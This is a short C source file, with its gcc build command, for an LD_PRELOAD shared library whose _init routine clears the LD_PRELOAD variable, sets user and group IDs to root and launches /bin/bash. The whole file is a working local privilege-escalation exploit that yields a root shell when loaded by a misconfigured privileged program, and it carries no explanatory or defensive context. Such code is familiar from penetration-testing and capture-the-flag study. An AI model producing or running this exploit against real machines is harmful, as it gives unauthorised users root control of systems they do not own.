// gcc -fPIC -shared -o shell.so ld_preload_shell.c -nostartfiles

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
